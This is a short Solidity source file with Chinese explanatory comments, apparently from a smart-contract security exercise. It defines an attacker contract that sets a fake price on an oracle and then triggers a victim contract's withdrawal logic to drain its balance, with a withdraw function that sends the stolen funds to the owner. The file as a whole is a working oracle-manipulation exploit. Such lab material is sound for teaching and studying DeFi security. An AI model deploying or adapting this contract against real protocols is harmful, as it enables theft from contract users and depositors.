// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// IVictim : 我只在乎這個合約有 trigger() 這個函式，其他的我都不管。
// interface : 在 Solidity 中，如果你要跟「另一個合約」互動，
//             但你不需要它完整的程式碼，你可以只寫一份介面（interface）來「模擬它的外觀」，就像 API 文件一樣。

interface IVictim {
    function trigger() external;
}

interface IOracle {
    function setPrice(uint256 _price) external;
}

contract AttackerContract {
    address public owner;
    address public oracle;
    address public victim;

    constructor(address _oracle, address _victim) {
        owner = msg.sender;
        oracle = _oracle;
        victim = _victim;
    }

    function setVictim(address _victim) external {
        victim = _victim;
    }

    function attack(uint256 fakePrice) public {
        require(msg.sender == owner, "Only owner can attack");
        require(address(victim).balance > 0, "no funds left");

        // 1️.改低價格
        IOracle(oracle).setPrice(fakePrice);
        
        // 2️.觸發 Victim 合約提款邏輯
        IVictim(victim).trigger();
        // 把 victim 這個地址當成 IVictim 這種格式來操作，然後我知道它有 trigger()，所以我可以呼叫它。
    }

    // 提款功能：將騙到的錢轉回你自己帳戶
    function withdraw() public {
        require(msg.sender == owner, "Only owner can withdraw");
        require(address(this).balance > 0, "No funds left");
        payable(owner).transfer(address(this).balance);
    }

    // 3️.合約可以接收錢
    receive() external payable {}
}
